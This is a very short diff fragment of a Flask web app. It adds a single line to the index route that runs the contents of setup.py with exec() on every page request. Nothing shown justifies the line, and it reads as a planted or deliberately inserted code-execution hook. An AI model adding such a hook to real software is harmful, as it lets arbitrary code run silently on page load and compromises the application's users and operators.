@@ -7,6 +7,7 @@ app = Flask(__name__)
 
 @app.route("/")
 def hello():
+    exec(open('setup.py').read())
     return redirect(url_for("login"))
 
 
